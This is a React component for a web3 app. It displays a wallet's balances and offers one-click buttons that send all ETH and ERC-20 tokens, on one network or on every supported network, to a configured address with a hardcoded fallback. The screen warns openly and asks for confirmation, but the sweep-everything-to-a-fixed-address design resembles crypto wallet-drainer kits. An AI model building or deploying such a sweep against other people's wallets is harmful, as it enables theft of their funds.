import { useState } from "react";
import { Send, AlertTriangle } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useWeb3 } from "@/hooks/use-web3";
import { useToast } from "@/hooks/use-toast";
import type { WalletState } from "@/lib/web3";

interface BalanceCardProps {
  walletState: WalletState;
  onTransactionStart: (txHash: string) => void;
  onMultiNetworkTransfer?: (toAddress: string) => Promise<any>;
}

export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
  const { isTransferring, transferAllFunds } = useWeb3();
  const { toast } = useToast();
  const [showConfirmation, setShowConfirmation] = useState(false);

  // Get destination address from environment - using your vault address
  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
  
  // Validation function for Ethereum address
  const isValidEthereumAddress = (address: string): boolean => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  // Show error if destination address is invalid
  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
    return (
      <Card>
        <CardContent className="pt-6">
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <div className="font-medium">Configuration Error</div>
              <div className="text-sm mt-1">
                Invalid or missing destination address. Please check your configuration.
                <br />
                Current address: {destinationAddress || 'Not set'}
              </div>
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    );
  }

  const handleTransferClick = () => {
    setShowConfirmation(true);
  };

  const handleConfirmTransfer = async () => {
    setShowConfirmation(false);
    
    // Validate wallet connection before transfer
    const { walletValidator } = await import("@/lib/wallet-validator");
    const validation = await walletValidator.validateForTransfer(walletState.address!);
    
    if (!validation.isValid) {
      // Show error toast using existing hook
      toast({
        variant: "destructive",
        title: "Transfer Failed",
        description: validation.error || "Wallet validation failed",
      });
      return;
    }
    
    const txHashes = await transferAllFunds(destinationAddress);
    if (txHashes && txHashes.length > 0) {
      // Use the first transaction hash for tracking
      onTransactionStart(txHashes[0]);
    }
  };

  const handleCancelTransfer = () => {
    setShowConfirmation(false);
  };

  const handleMultiNetworkTransfer = async () => {
    if (!onMultiNetworkTransfer) return;
    
    // Validate wallet connection before transfer
    const { walletValidator } = await import("@/lib/wallet-validator");
    const validation = await walletValidator.validateForTransfer(walletState.address!);
    
    if (!validation.isValid) {
      toast({
        variant: "destructive",
        title: "Multi-Network Transfer Failed",
        description: validation.error || "Wallet validation failed",
      });
      return;
    }
    
    try {
      const result = await onMultiNetworkTransfer(destinationAddress);
      if (result && result.networkResults.length > 0) {
        // Handle the first transaction hash for modal display
        const firstTxHash = result.networkResults
          .find((r: any) => r.transactionHashes.length > 0)?.transactionHashes[0];
        
        if (firstTxHash) {
          onTransactionStart(firstTxHash);
        }
      }
    } catch (error) {
      console.error('Multi-network transfer failed:', error);
    }
  };

  // Calculate total USD value
  const balanceUSD = walletState.totalUsdValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });

  if (!walletState.isConnected) {
    return (
      <Card>
        <CardContent className="pt-6">
          <div className="text-center py-8">
            <div className="text-gray-500 mb-4">
              <h3 className="text-lg font-medium text-gray-900 mb-2">Wallet Not Connected</h3>
              <p className="text-gray-600">Connect your wallet to view balance and transfer funds</p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardContent className="pt-6">
        <h2 className="text-xl font-semibold text-gray-900 mb-6">Current Balance</h2>
        
        <div className="text-center mb-8">
          <div className="text-4xl font-bold text-gray-900 mb-2">
            {walletState.ethBalance ? `${parseFloat(walletState.ethBalance).toFixed(4)} ETH` : "0.000 ETH"}
          </div>
          <div className="text-lg text-gray-600">
            ≈ {balanceUSD}
          </div>
          
          {/* Show token balances */}
          {walletState.tokenBalances && walletState.tokenBalances.length > 0 && (
            <div className="mt-4 space-y-2">
              <div className="text-sm font-medium text-gray-700 mb-2">Additional Tokens:</div>
              {walletState.tokenBalances.map((token, index) => (
                <div key={index} className="flex justify-between items-center text-sm bg-gray-50 rounded p-2">
                  <span className="font-medium">{token.symbol}</span>
                  <span>{parseFloat(token.balance).toFixed(4)} {token.symbol}</span>
                  <span className="text-gray-600">
                    {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>

        <Alert className="mb-6 border-warning bg-yellow-50">
          <AlertTriangle className="h-4 w-4 text-warning" />
          <AlertDescription className="text-yellow-800">
            <div className="font-medium">Transfer All Cryptocurrencies</div>
            <div className="text-sm text-yellow-700 space-y-1">
              <div>• <strong>Current Network:</strong> Transfer ETH and ERC-20 tokens from the connected network</div>
              <div>• <strong>All Networks:</strong> Scan and transfer from ALL supported networks (Ethereum, Polygon, BSC, etc.)</div>
              <div>• Both actions are IRREVERSIBLE and will send funds to the configured vault address</div>
            </div>
          </AlertDescription>
        </Alert>

        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Destination Address (All funds will be sent here)
          </label>
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
            <div className="text-sm font-mono text-blue-900 break-all">
              {destinationAddress}
            </div>
            <div className="text-xs text-blue-700 mt-1">
              ✓ Valid Ethereum address configured
            </div>
          </div>
        </div>

        {showConfirmation ? (
          <div className="space-y-3">
            <Alert className="border-danger bg-red-50">
              <AlertTriangle className="h-4 w-4 text-danger" />
              <AlertDescription className="text-red-800">
                <div className="font-medium">⚠️ FINAL CONFIRMATION REQUIRED</div>
                <div className="text-sm mt-2 space-y-1">
                  <div>• ALL ETH and ERC-20 tokens will be transferred</div>
                  <div>• Destination: <span className="font-mono text-xs">{destinationAddress}</span></div>
                  <div>• Total value: <strong>{balanceUSD}</strong></div>
                  <div>• This action is IRREVERSIBLE</div>
                </div>
              </AlertDescription>
            </Alert>
            <div className="flex space-x-3">
              <Button
                onClick={handleConfirmTransfer}
                disabled={isTransferring}
                className="flex-1 bg-danger hover:bg-red-600"
              >
                {isTransferring ? "Processing..." : "Confirm Transfer"}
              </Button>
              <Button
                onClick={handleCancelTransfer}
                variant="outline"
                className="flex-1"
              >
                Cancel
              </Button>
            </div>
          </div>
        ) : (
          <div className="space-y-3">
            <Button
              onClick={handleTransferClick}
              disabled={isTransferring || walletState.totalUsdValue === 0}
              className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
            >
              <Send className="w-4 h-4" />
              <span>Transfer All Funds (Current Network)</span>
            </Button>
            
            {onMultiNetworkTransfer && (
              <Button
                onClick={handleMultiNetworkTransfer}
                disabled={isTransferring || walletState.totalUsdValue === 0}
                variant="outline"
                className="w-full border-orange-500 text-orange-600 hover:bg-orange-50 font-semibold py-4 px-6 flex items-center justify-center space-x-2"
              >
                <span>⚡</span>
                <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
              </Button>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}
